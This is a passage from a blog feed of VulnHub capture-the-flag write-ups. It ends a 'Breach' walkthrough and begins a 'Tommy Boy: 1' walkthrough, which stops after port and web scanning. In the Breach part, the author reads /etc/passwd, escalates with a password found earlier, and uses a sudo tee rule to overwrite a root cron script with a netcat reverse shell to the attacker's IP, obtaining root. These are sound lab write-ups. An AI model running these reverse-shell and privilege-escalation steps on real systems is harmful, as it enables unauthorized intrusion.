</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="s1">&#39;_ \ / _ \ &#39;</span>__/ _ <span class="se">\ </span>/ __<span class="p">|</span> <span class="p">|</span> <span class="s1">&#39;_ \ / _ \| __| &#39;</span>_ <span class="se">\|</span> <span class="p">|</span> <span class="s1">&#39;_ \ / _` | | &#39;</span>_ <span class="se">\ </span>/ _ <span class="se">\ </span><span class="err">&#39;</span>__/ _ <span class="se">\</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span>  __/ <span class="se">\_</span>_ <span class="se">\ </span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span>  __/
</span><span class='line'>  <span class="se">\_</span>/ <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span> <span class="p">|</span>___/ <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/ <span class="se">\_</span>_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_, <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span>
</span><span class='line'>                                                                  __/ <span class="p">|</span>
</span><span class='line'>                                                                 <span class="p">|</span>___/
</span></code></pre></td></tr></table></div></figure>


<p>I found that account <code>blumbergh</code> is owned by <code>Bill Lumbergh</code> when I was checking the file <code>/etc/passwd</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home<span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:106::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:103:109::/var/lib/landscape:/bin/false
</span><span class='line'>milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
</span><span class='line'>tomcat6:x:104:112::/usr/share/tomcat6:/bin/false
</span><span class='line'>colord:x:105:114:colord colour management daemon,,,:/var/lib/colord:/bin/false
</span><span class='line'>mysql:x:106:116:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
</span></code></pre></td></tr></table></div></figure>


<p>Things are getting clear, from the previous notes, I got a string <code>coffeestains</code>, in <code>bill.png</code>, which looks like a password, and now I got Bill&rsquo;s account name is <code>blumbergh</code>.</p>

<p>Now I tried to <code>su</code> to <code>blumbergh</code> with the password <code>coffeestains</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home<span class="nv">$ </span>su blumbergh
</span><span class='line'>su blumbergh
</span><span class='line'>Password: coffeestains
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:/home<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span>
</span><span class='line'>blumbergh@Breach:/home<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Great! got in!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>blumbergh@Breach:/home<span class="nv">$ </span><span class="nb">cd </span>blumbergh
</span><span class='line'><span class="nb">cd </span>blumbergh
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 28
</span><span class='line'>drwxr-xr-x <span class="m">3</span> blumbergh blumbergh <span class="m">4096</span> Jun <span class="m">12</span> 09:42 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root      root      <span class="m">4096</span> Jun  <span class="m">4</span> 19:24 ..
</span><span class='line'>-rw------- <span class="m">1</span> blumbergh blumbergh   <span class="m">61</span> Jun <span class="m">12</span> 09:42 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> blumbergh blumbergh  <span class="m">220</span> Jun  <span class="m">4</span> 19:24 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> blumbergh blumbergh <span class="m">3637</span> Jun  <span class="m">4</span> 19:24 .bashrc
</span><span class='line'>drwx------ <span class="m">2</span> blumbergh blumbergh <span class="m">4096</span> Jun  <span class="m">6</span> 17:55 .cache
</span><span class='line'>-rw-r--r-- <span class="m">1</span> blumbergh blumbergh  <span class="m">675</span> Jun  <span class="m">4</span> 19:24 .profile
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>cat .bash_history
</span><span class='line'>cat .bash_history
</span><span class='line'>clear
</span><span class='line'>logoff
</span><span class='line'><span class="nb">logout</span>
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'><span class="nb">cd</span> /usr/share/cleanup
</span><span class='line'>cat tidyup.sh
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>locate tidyup.sh
</span><span class='line'>locate tidyup.sh
</span><span class='line'>/usr/share/cleanup/tidyup.sh
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>ls -al /usr/share/cleanup/tidyup.sh
</span><span class='line'>ls -al /usr/share/cleanup/tidyup.sh
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root <span class="m">289</span> Jun <span class="m">12</span> 09:36 /usr/share/cleanup/tidyup.sh
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Hacker Evasion Script </span>
</span><span class='line'><span class="c">#Initech Cyber Consulting, LLC</span>
</span><span class='line'><span class="c">#Peter Gibbons and Michael Bolton - 2016</span>
</span><span class='line'><span class="c">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span>
</span><span class='line'>
</span><span class='line'><span class="nb">cd</span> /var/lib/tomcat6/webapps <span class="o">&amp;&amp;</span> find swingline -mindepth <span class="m">1</span> -maxdepth <span class="m">10</span> <span class="p">|</span> xargs rm -rf
</span><span class='line'>
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> blumbergh on Breach:
</span><span class='line'>    env_reset, mail_badpass,
</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User blumbergh may run the following commands on Breach:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Here I know that <code>tidyup.sh</code> script will be run automatically every 3 minutes, and <code>blumbergh</code> got ROOT priviledge to run the command <code>/usr/bin/tee /usr/share/cleanup/tidyup.sh</code> which will be able to modify the <code>tidyup.sh</code> script to evil shell.</p>

<p>After setup <code>nc</code> to listen on local port 7777, I run the following command to modify <code>tidyup.sh</code> script to include evil code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>blumbergh@Breach:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;nc -e /bin/bash 192.168.110.129 7777&quot;</span> <span class="p">|</span> sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
</span><span class='line'>tee /usr/share/cleanup/tidyup.sh0.129 7777<span class="err">&quot;</span> <span class="p">|</span> sudo /usr/bin/
</span><span class='line'>nc -e /bin/bash 192.168.110.129 7777
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>nc -e /bin/bash 192.168.110.129 7777
</span></code></pre></td></tr></table></div></figure>


<p>Then waiting a few minutes, I got ROOT in !! :D</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 7777
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ...
</span><span class='line'>connect to <span class="o">[</span>192.168.110.129<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.140<span class="o">]</span> 45022
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/root
</span><span class='line'>ls -la
</span><span class='line'>total 60
</span><span class='line'>drwx------  <span class="m">4</span> root root  <span class="m">4096</span> Jun <span class="m">12</span> 09:37 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root  <span class="m">4096</span> Jun  <span class="m">4</span> 09:56 ..
</span><span class='line'>-rw-------  <span class="m">1</span> root root   <span class="m">115</span> Jun <span class="m">12</span> 09:42 .bash_history
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">3106</span> Feb <span class="m">19</span>  <span class="m">2014</span> .bashrc
</span><span class='line'>drwx------  <span class="m">2</span> root root  <span class="m">4096</span> Jun  <span class="m">6</span> 15:17 .cache
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root   <span class="m">840</span> Jun <span class="m">11</span> 17:34 .flag.txt
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root <span class="m">23792</span> Jun  <span class="m">4</span> 19:17 flair.jpg
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root   <span class="m">140</span> Feb <span class="m">19</span>  <span class="m">2014</span> .profile
</span><span class='line'>drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Jun  <span class="m">5</span> 17:51 .rpmdb
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root    <span class="m">66</span> Jun  <span class="m">4</span> 19:48 .selected_editor
</span><span class='line'>cat .flag.txt
</span><span class='line'>-----------------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>______                     _     __   _____      _____ _          _____          _
</span><span class='line'><span class="p">|</span> ___ <span class="se">\ </span>                  <span class="p">|</span> <span class="p">|</span>   /  <span class="p">|</span> <span class="p">|</span>  _  <span class="p">|</span>    <span class="p">|</span>_   _<span class="p">|</span> <span class="p">|</span>        <span class="p">|</span>  ___<span class="p">|</span>        <span class="p">|</span> <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_/ /_ __ ___  __ _  ___<span class="p">|</span> <span class="p">|</span>__ <span class="sb">`</span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/<span class="s1">&#39; |______| | | |__   ___| |__ _ __   __| |</span>
</span><span class='line'><span class="s1">| ___ \ &#39;</span>__/ _ <span class="se">\/</span> _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="s1">&#39;_ \ | | |  /| |______| | | &#39;</span>_ <span class="se">\ </span>/ _ <span class="se">\ </span> __<span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_/ / <span class="p">|</span> <span class="p">|</span>  __/ <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">||</span> <span class="p">|</span>_<span class="se">\ </span><span class="p">|</span>_/ /      <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span>
</span><span class='line'><span class="se">\_</span>___/<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="se">\_</span>__<span class="o">(</span>_<span class="o">)</span>___/       <span class="se">\_</span>/ <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="se">\_</span>___/_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>-----------------------------------------------------------------------------------
</span><span class='line'>Congrats on reaching the end and thanks <span class="k">for</span> trying out my first <span class="c">#vulnhub boot2root!</span>
</span><span class='line'>
</span><span class='line'>Shout-out to knightmare, and rastamouse <span class="k">for</span> testing and g0tmi1k <span class="k">for</span> hosting.
</span></code></pre></td></tr></table></div></figure>




<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Tommy Boy: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/09/13/vulnhub-tommy-boy-1/"/>
    <updated>2016-09-13T21:40:53+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/09/13/vulnhub-tommy-boy-1</id>
    <content type="html"><![CDATA[<p>&ldquo;HOLY SCHNIKES! Tommy Boy needs your help!</p>

<p>The Callahan Auto company has finally entered the world of modern technology and stood up a Web server for their customers to use for ordering brake pads.</p>

<p>Unfortunately, the site just went down and the only person with admin credentials is Tom Callahan Sr. - who just passed away! And to make matters worse, the only other guy with knowledge of the server just quit!</p>

<p>You&rsquo;ll need to help Tom Jr., Richard and Michelle get the Web page restored again. Otherwise Callahan Auto will most certainly go out of business :-(&ldquo; &ndash; <a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: PwnLab: init (<em>10.1.1.141/24</em>)</p>

<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.141    00:0c:29:8f:0f:b7   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:f1:c0:1f   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.363 seconds <span class="o">(</span>108.34 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.141</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# masscan -p1-65535 10.1.1.141/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-09-04 11:29:55 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 8008/tcp on 10.1.1.141
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.141
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.141
</span><span class='line'>Discovered open port 65534/tcp on 10.1.1.141
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.141
</span><span class='line'>Host is up <span class="o">(</span>0.00035s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: POST OPTIONS GET HEAD
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">4</span> disallowed entries
</span><span class='line'><span class="p">|</span> /6packsofb...soda /lukeiamyourfather
</span><span class='line'><span class="p">|</span>_/lookalivelowbridge /flag-numero-uno.txt
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Welcome to Callahan Auto
</span><span class='line'>8008/tcp  open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: POST OPTIONS GET HEAD
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: KEEP OUT
</span><span class='line'>65534/tcp open  ftp     ProFTPD
</span><span class='line'>MAC Address: 00:0C:29:8F:0F:B7 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Based on the result of NMAP scan, firstly, I found OpenSSH 7.2p2 running on port 22, Apache httpd 2.4.18 running on port 80 and 8008 and ProFTPd running on port 65534.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>

<p>Nothing found on port 8008, however, there are some interesting findings from nikto scan on port 80:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>+ Entry <span class="s1">&#39;/6packsofb...soda&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>301<span class="o">)</span>
</span><span class='line'>+ OSVDB-3268: /lukeiamyourfather/: Directory indexing found.
</span><span class='line'>+ Entry <span class="s1">&#39;/lukeiamyourfather/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ OSVDB-3268: /lookalivelowbridge/: Directory indexing found.
</span><span class='line'>+ Entry <span class="s1">&#39;/lookalivelowbridge/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ Entry <span class="s1">&#39;/flag-numero-uno.txt&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ <span class="s2">&quot;robots.txt&quot;</span> contains <span class="m">4</span> entries which should be manually viewed.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span></code></pre></td></tr></table></div></figure>


<p>I noticed that the robot file <code>robots.txt</code> is found and including 4 entries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
